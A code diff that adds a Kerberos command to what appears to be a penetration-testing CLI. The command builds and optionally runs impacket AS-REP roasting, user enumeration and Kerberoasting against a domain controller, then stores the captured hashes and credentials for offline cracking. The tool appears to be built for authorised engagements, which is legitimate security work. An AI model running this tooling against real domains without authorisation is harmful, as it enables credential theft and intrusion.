@@ -1202,6 +1202,84 @@ def crack(config: Path = typer.Argument(..., help="engagement YAML"),
 
 
 @app.command()
+def kerberos(config: Path = typer.Argument(..., help="engagement YAML"),
+             dc: str = typer.Option(..., "--dc", help="domain controller IP"),
+             domain: str = typer.Option(..., help="AD domain (e.g. corp.local)"),
+             users: Path = typer.Option(None, "--users", help="username list file "
+                                        "(default: usernames already in state)"),
+             user: str = typer.Option(None, help="a domain user for Kerberoasting"),
+             password: str = typer.Option(None, help="that user's password"),
+             parse_file: Path = typer.Option(None, "--parse-file",
+                                             help="parse AS-REP/TGS hashes from a file"),
+             run: bool = typer.Option(False, "--run",
+                                      help="actually run the AS-REP roast (impacket)")):
+    """Active Kerberos: AS-REP roast + Kerberoast (print, run, or parse into state)."""
+    from .analysis.kerberos import (
+        asrep_command,
+        creds_from_roast,
+        kerberoast_command,
+        parse_roast,
+        userenum_command,
+    )
+    cfg = _load_config(config)
+    work = ENGAGEMENTS / cfg.name
+    state_path = work / "state.json"
+    state = _load_state(state_path) if state_path.exists() else EngagementState(name=cfg.name)
+
+    # Resolve the user list: an explicit file, else usernames already collected.
+    userlist = str(users) if users else ""
+    if not userlist:
+        names = sorted({c.username for c in state.credentials if c.username})
+        if names:
+            work.mkdir(parents=True, exist_ok=True)
+            userlist = str(work / "users.txt")
+            Path(userlist).write_text("\n".join(names) + "\n", encoding="utf-8")
+
+    console.print("[bold]Kerberos commands[/] (review before running):")
+    if userlist:
+        console.print("  " + " ".join(userenum_command(domain, dc, userlist)), markup=False)
+        console.print("  " + " ".join(asrep_command(domain, dc, userlist)), markup=False)
+    else:
+        console.print("  [yellow](no user list — pass --users or collect usernames first)[/]")
+    if user and password:
+        console.print("  " + " ".join(kerberoast_command(domain, dc, user, password)),
+                      markup=False)
+    console.print()
+
+    def _ingest(text: str) -> int:
+        findings = parse_roast(text, host=dc)
+        existing = {f.title for f in state.findings}
+        added = 0
+        for f in findings:
+            if f.title not in existing:
+                state.add_finding(f)
+                added += 1
+        for c in creds_from_roast(text):
+            if not any(x.secret == c.secret for x in state.credentials):
+                state.credentials.append(c)
+        return added
+
+    total = 0
+    if parse_file and Path(parse_file).is_file():
+        total += _ingest(Path(parse_file).read_text(encoding="utf-8", errors="replace"))
+    if run and userlist:
+        import subprocess
+        argv = asrep_command(domain, dc, userlist)
+        console.print(f"[dim]running: {' '.join(argv)}[/]")
+        try:
+            p = subprocess.run(argv, capture_output=True, text=True, timeout=180)
+            total += _ingest(p.stdout + "\n" + p.stderr)
+        except (OSError, subprocess.SubprocessError) as exc:
+            console.print(f"[yellow]could not run impacket-GetNPUsers: {exc}[/]")
+
+    if total:
+        state_path.parent.mkdir(parents=True, exist_ok=True)
+        state.save(state_path)
+    console.print(f"[bold green]kerberos[/] +{total} roastable finding(s); "
+                  f"run `crack` to attack the hashes.")
+
+
+@app.command()
 def status(config: Path = typer.Argument(..., help="engagement YAML")):
     """Show current known state for an engagement."""
     cfg = _load_config(config)
